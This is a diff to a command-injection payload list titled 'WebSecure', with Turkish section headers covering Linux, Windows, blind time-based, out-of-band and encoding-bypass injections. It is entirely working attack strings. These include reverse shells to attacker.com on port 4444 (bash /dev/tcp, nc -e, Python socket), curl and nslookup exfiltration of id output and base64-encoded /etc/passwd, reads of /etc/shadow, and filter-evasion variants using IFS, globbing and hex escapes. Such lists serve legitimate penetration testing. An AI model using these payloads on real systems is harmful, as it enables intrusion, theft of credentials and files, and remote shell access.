@@ -1,3 +1,7 @@
+# Command Injection Payloads — WebSecure
+# Linux | Windows | Blind-time-based | OOB | Encoding-bypass
+
+# ── TEMEL SEPERATÖRLER ──
 ;id
 |id
 ||id
@@ -10,79 +14,159 @@ $(id)
 &&whoami
 `whoami`
 $(whoami)
-;hostname
-;uname -a
+;id;
+|id|
+;id #
+; id
+| id
+|| id
+&& id
+& id
+&id
+
+# ── LİNUX PAYLOAD'LARI ──
 ;cat /etc/passwd
 |cat /etc/passwd
-||cat /etc/passwd
-&&cat /etc/passwd
-;ls -la /
-|ls /
+;cat /etc/hosts
+;cat /etc/shadow
+;ls -la
+;ls /
+;ls /var/www/html
 ;pwd
 ;env
 ;printenv
-;ipconfig
-|ipconfig
-&&ipconfig
+;uname -a
+;id;uname -a;whoami
+;id;cat /etc/passwd;uname -a
+$(cat /etc/passwd)
+`cat /etc/passwd`
+;echo ${IFS}
+;printf '\x77\x68\x6f\x61\x6d\x69'
+;sh -i >& /dev/tcp/attacker.com/4444 0>&1
+;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+;/bin/sh -i
+;/bin/bash -c 'id'
+;/usr/bin/id
+;command id
+;type id
+;which id
+;${PATH%%:*}/id
+
+# ── WİNDOWS PAYLOAD'LARI ──
 &whoami
-&systeminfo
-;ver
-;dir C:\
+|whoami
+& whoami
+&& whoami
+|| whoami
+; whoami
+`whoami`
+&ver
+&ipconfig
+&ipconfig /all
+&dir
+&dir C:\
 &type C:\Windows\win.ini
-; sleep 5
-| sleep 5
-|| sleep 5
-&& sleep 5
-`sleep 5`
-$(sleep 5)
-; sleep 10
-; ping -c 5 127.0.0.1
-| ping -c 5 127.0.0.1
-; ping 127.0.0.1 -n 5
-; curl http://attacker.com/?c=$(id)
-; wget http://attacker.com/?c=$(id)
-| curl http://attacker.com/?c=`id`
-; nslookup $(id).attacker.com
-${IFS}id
-${IFS}cat${IFS}/etc/passwd
-$IFS$()id
+&type C:\Windows\System32\drivers\etc\hosts
+&set
+&echo %USERNAME%
+&echo %COMPUTERNAME%
+&net user
+&net user Administrator
+&systeminfo
+&tasklist
+|cmd /c whoami
+&cmd /c whoami
+;cmd /c whoami
+%0a whoami
+%0d whoami
+%0a%0d whoami
+
+# ── KÖR (BLIND) TIME-BASED ──
+;sleep 3
+;sleep 5
+| sleep 3
+|| sleep 3
+&& sleep 3
+$(sleep 3)
+`sleep 3`
+;ping -c 3 127.0.0.1
+;ping -n 3 127.0.0.1
+& ping -n 3 127.0.0.1
+;timeout 3
+;waitfor /T 3 signal
+; sleep ${IFS}3
+;sleep${IFS}3
+$(sleep${IFS}3)
+`sleep${IFS}3`
+;sleep 3 #
+;sleep 3;
+;bash -c 'sleep 3'
+;python -c 'import time;time.sleep(3)'
+;perl -e 'sleep 3'
+;ruby -e 'sleep 3'
+
+# ── OOB (DNS/HTTP geri bildirim) ──
+;curl http://attacker.com/$(id)
+;wget http://attacker.com/$(id)
+;curl -s http://attacker.com/?c=$(id|base64)
+;curl -s http://attacker.com/?c=$(cat /etc/passwd|base64)
+;nslookup $(whoami).attacker.com
+;nslookup `whoami`.attacker.com
+;host `id`.attacker.com
+;ping -c 1 `id`.attacker.com
+;curl http://$(id).attacker.com/
+$(curl http://attacker.com/?x=$(id))
+`curl http://attacker.com/?x=\`id\``
+;nc attacker.com 4444 -e /bin/sh
+;bash -i >& /dev/tcp/attacker.com/4444 0>&1
+;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# ── ENCODING BYPASS ──
+;%69%64
+|%77%68%6f%61%6d%69
+;%2F%62%69%6E%2F%73%68%20-c%20id
+;$(printf%09'\x69\x64')
+$(printf '\x69\x64')
+`printf '\x69\x64'`
+;$'\x69\x64'
+;{id}
+;{cat,/etc/passwd}
 ;cat${IFS}/etc/passwd
 ;cat$IFS/etc/passwd
-%3Bid
-%7Cid
-%7C%7Cid
-%26%26id
-%60id%60
-%24%28id%29
+;cat$IFS$1/etc$IFS$1passwd
+;cat</etc/passwd
+;rev<<<;di
+;$@|id
+;*id*
+;/?in/id
+;/???/id
+;/???/???
+;/b?n/c?t /etc/pa???wd
+
+# ── PIPES VE ZİNCİRLEME ──
+; ls|head -1
+; echo abc|base64
+; echo abc|rev
+; ls -la && id
+; id && uname
+; false || id
+; id || false
+; (id)
+; ((id))
+; id;ls;pwd;uname
+;id%0aid
 %0aid
-%0did
-%0a%0did
-;%0aid
-|%0aid
-%0a/bin/sh -c id
-ca\t /etc/passwd
-c'a't /etc/passwd
-who$()ami
-w\hoami
-/usr/bin/id
-/usr/bin/whoami
-/bin/sh -c id
-/bin/bash -c id
-bash -c 'id'
-sh -c 'id'
-; bash -i >& /dev/tcp/attacker.com/4444 0>&1
-; nc -e /bin/sh attacker.com 4444
-cmd /c whoami
-cmd.exe /c dir
-cmd.exe /c ipconfig /all
-powershell -c whoami
-'; id; echo '
-' && id && '
-1;id
-1|id
-1||id
-1&&id
--1;id
-; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
-; /usr/bin/python3 -c 'import os;os.system("id")'
-; perl -e 'system("id")'
+%0a id %0a
+
+# ── ÇEVRE BYPASS ──
+;$IFS$9id
+;${!#}
+;$SHELL
+;$0 -c id
+;${IFS}id${IFS}
+;echo${IFS}test
+;X=$'i\144';$X
+;X=$'wh\157ami';$X
+; ?
+;: ; id
+;. /etc/passwd
